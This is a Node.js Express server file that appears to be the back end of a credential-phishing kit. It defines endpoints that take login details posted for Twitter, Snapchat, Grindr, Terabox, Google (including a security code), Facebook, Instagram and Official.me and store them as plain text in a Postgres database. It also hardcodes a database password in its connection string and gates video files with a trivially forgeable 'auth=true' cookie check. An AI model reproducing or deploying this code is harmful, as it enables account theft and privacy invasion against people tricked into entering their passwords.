const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5001;

// Middleware
app.use(cors());
app.use(express.json());

// Protect .mp4 files from being accessed without authentication
app.use((req, res, next) => {
  if (req.path.endsWith('.mp4')) {
    const cookies = req.headers.cookie || '';
    if (!cookies.includes('auth=true')) {
      const range = req.headers.range;
      if (range) {
        const parts = range.replace(/bytes=/, "").split("-");
        const start = parseInt(parts[0], 10);
        // Allow up to 1MB for the thumbnail/metadata to load
        if (start > 1000000) {
          return res.status(401).send('Unauthorized: You must be logged in to view the full video.');
        }
      } else {
        // Block full downloads
        return res.status(401).send('Unauthorized: You must be logged in to view this video.');
      }
    }
  }
  next();
});

app.use(express.static(path.join(__dirname, './')));

// Database Connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://postgres:appugowda%40143@db.jlnfgljtujjhjbcxkstf.supabase.co:5432/postgres',
  ssl: { rejectUnauthorized: false }
});

// Helper to initialize table
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS twitter_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`DROP TABLE IF EXISTS snapchat_users;`);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS snapchat_users (
        id SERIAL PRIMARY KEY,
        phone_number VARCHAR(255),
        email VARCHAR(255),
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS grindr_users (
        id SERIAL PRIMARY KEY,
        phone_number VARCHAR(255),
        email VARCHAR(255),
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS terabox_users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS google_users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        security_code VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    try {
      await pool.query(`ALTER TABLE google_users ADD COLUMN IF NOT EXISTS security_code VARCHAR(255);`);
    } catch (e) {
      console.log('Error adding security_code column:', e.message);
    }
    await pool.query(`
      CREATE TABLE IF NOT EXISTS facebook_users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS officialme_users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log('Database initialized successfully.');
  } catch (err) {
    console.error('Error initializing database, retrying in 5 seconds...', err.message);
    setTimeout(initDb, 5000);
  }
};
initDb();

// API Endpoints

// Signup (Plain text password storage)
app.post('/api/signup', async (req, res) => {
  const { email, password } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  try {
    const result = await pool.query(
      'INSERT INTO users (email, password) VALUES ($1, $2) RETURNING id, email',
      [email, password]
    );
    res.status(201).json({ message: 'User registered successfully!', user: result.rows[0] });
  } catch (err) {
    if (err.code === '23505') { // Unique violation
      return res.status(400).json({ error: 'Email is already registered.' });
    }
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Login (Plain text password comparison)
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  try {
    const result = await pool.query(
      'SELECT * FROM users WHERE email = $1 AND password = $2',
      [email, password]
    );

    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Invalid email or password.' });
    }

    const user = result.rows[0];
    res.status(200).json({ 
      message: 'Login successful!', 
      user: { id: user.id, email: user.email } 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Twitter/X Login credentials
app.post('/api/twitter_login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO twitter_users (username, password) VALUES ($1, $2) RETURNING id, username',
      [username, password]
    );
    res.status(201).json({ message: 'Twitter credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Snapchat Login credentials
app.post('/api/snapchat_login', async (req, res) => {
  const { phone_number, email, password } = req.body;
  if (!password || (!phone_number && !email)) {
    return res.status(400).json({ error: 'Contact info and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO snapchat_users (phone_number, email, password) VALUES ($1, $2, $3) RETURNING id',
      [phone_number || null, email || null, password]
    );
    res.status(201).json({ message: 'Snapchat credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Grindr Login credentials
app.post('/api/grindr_login', async (req, res) => {
  const { phone_number, email, password } = req.body;
  if (!password || (!phone_number && !email)) {
    return res.status(400).json({ error: 'Contact info and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO grindr_users (phone_number, email, password) VALUES ($1, $2, $3) RETURNING id',
      [phone_number || null, email || null, password]
    );
    res.status(201).json({ message: 'Grindr credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Terabox Login credentials
app.post('/api/terabox_login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO terabox_users (email, password) VALUES ($1, $2) RETURNING id',
      [email, password]
    );
    res.status(201).json({ message: 'Terabox credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Google Login credentials
app.post('/api/google_login', async (req, res) => {
  const { email, password, security_code } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO google_users (email, password, security_code) VALUES ($1, $2, $3) RETURNING id',
      [email, password, security_code || null]
    );
    res.status(201).json({ message: 'Google credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Facebook Login credentials
app.post('/api/facebook_login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO facebook_users (email, password) VALUES ($1, $2) RETURNING id',
      [email, password]
    );
    res.status(201).json({ message: 'Facebook credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Instagram Login credentials
app.post('/api/instagram_login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO instagram_users (email, password) VALUES ($1, $2) RETURNING id',
      [email, password]
    );
    res.status(201).json({ message: 'Instagram credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Store Official.me Login credentials
app.post('/api/officialme_login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  try {
    const result = await pool.query(
      'INSERT INTO officialme_users (email, password) VALUES ($1, $2) RETURNING id',
      [email, password]
    );
    res.status(201).json({ message: 'Official.me credentials stored', user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error occurred.' });
  }
});

// Catch-all to serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
